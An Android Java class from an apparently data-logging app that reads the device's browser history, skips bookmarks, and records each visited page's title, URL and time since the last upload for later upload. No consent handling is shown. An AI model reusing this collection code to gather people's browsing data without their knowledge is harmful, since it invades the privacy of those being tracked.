package com.example.pipa.item;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.provider.Browser;
import android.provider.CallLog;
import android.util.Log;

import com.example.plpa.utils.DateTimeHelper;
import com.example.plpa.utils.PreferenceHelper;
import com.example.plpa.utils.SettingString;

public class BrowserItem extends ExpItemBase {

	private final String mTag = SettingString.TAG;

	private final String ATTRI_TITLE = "title";
	private final String ATTRI_URL = "url";
	
	public final String ALERT_STRING = "瀏覽資訊";

	public BrowserItem(Service service) {
		// TODO Auto-generated constructor stub

		super(service);
		mExpPrefix = "Browser";
		mService = service;

	}

	@Override
	public boolean needTimeLimit() {
		// TODO Auto-generated method stub
		return false;
	}

	@SuppressLint("SimpleDateFormat")
	@Override
	public void doSomethingBeforeUpload(Context context) {
		// TODO Auto-generated method stub
		super.doSomethingBeforeUpload(context);
		
		long uploadTime = PreferenceHelper.getLong(context, PreferenceHelper.UPLOADED_TIME);
		
		Cursor webLinksCursor = context.getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, null, null, Browser.BookmarkColumns.DATE + " DESC");
		int row_count = webLinksCursor.getCount();

		int title_column_index = webLinksCursor.getColumnIndexOrThrow(Browser.BookmarkColumns.TITLE);
		int url_column_index = webLinksCursor.getColumnIndexOrThrow(Browser.BookmarkColumns.URL);

		if ((title_column_index > -1) && (url_column_index > -1) && (row_count > 0))
		{
		    webLinksCursor.moveToFirst();
		    SimpleDateFormat formatter = new SimpleDateFormat(
					"yyyy-MM-dd HH:mm:ss.SSS");
		    
		    while (webLinksCursor.isAfterLast() == false)
		    {
		    	int secondindex = webLinksCursor.getColumnIndex(Browser.BookmarkColumns.DATE);
				long seconds = webLinksCursor.getLong(secondindex);
				
				if(seconds < uploadTime)
					break;
				
		        if (webLinksCursor.getInt(Browser.HISTORY_PROJECTION_BOOKMARK_INDEX) != 1)
		        {
		            if (!webLinksCursor.isNull(url_column_index))
		            {
		            	String url = webLinksCursor.getString(url_column_index);
		            	String title = webLinksCursor.getString(title_column_index);
		            	String time = formatter.format(new Date(seconds));
		            	
		            	if(SettingString.mIsDebug) 
		            		Log.d(mTag, "page browsed, title:" + title + " url:" + url);

		            	List<RecordPairWithTime> list = new ArrayList<RecordPairWithTime>();
		            	
		            	RecordPairWithTime pair = new RecordPairWithTime();
		                pair.key = ATTRI_TITLE;
		                pair.value = title;
		                pair.dateTime = time;
		                list.add(pair);
		                
		                pair = new RecordPairWithTime();
		                pair.key = ATTRI_URL;
		                pair.value = url;
		                pair.dateTime = time;
		                list.add(pair);
		                
		                insertRecordWithTime(context, list);
		                
		            }
		        }
		        webLinksCursor.moveToNext();
		    }            
		}
		webLinksCursor.close();
	}
	
}
